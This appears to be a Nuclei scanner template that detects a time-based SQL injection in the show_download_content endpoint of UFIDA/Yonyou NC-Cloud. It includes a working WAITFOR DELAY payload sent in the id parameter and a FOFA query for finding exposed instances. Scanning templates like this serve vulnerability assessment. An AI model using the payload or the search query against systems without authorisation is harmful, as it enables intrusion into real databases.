http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 500
    - contains(tolower(body), "yonyou")
    type: dsl
  raw:
  - '@timeout 30s

    GET /ebvp/infopub/show_download_content;.js?id=1'';WAITFOR+DELAY+''0:0:6''-- HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-ufida-cloud-sqli
info:
  author: s4e-io
  description: 'The NC-Cloud system''s show_download_content interface has a SQL injection
    vulnerability, which allows attackers to manipulate the database through maliciously
    constructed SQL statements, resulting in data leaks, tampering or destruction,
    and seriously threatening system security.

    '
  metadata:
    fofa-query: "app=\"\u7528\u53CB-NC-Cloud\""
    max-request: 1
    verified: true
  name: UFIDA NC Cloud - SQL Injection
  reference:
  - https://blog.csdn.net/xc_214/article/details/141884644
  severity: high
  tags: time-based-sqli,sqli,yonyou,ufida
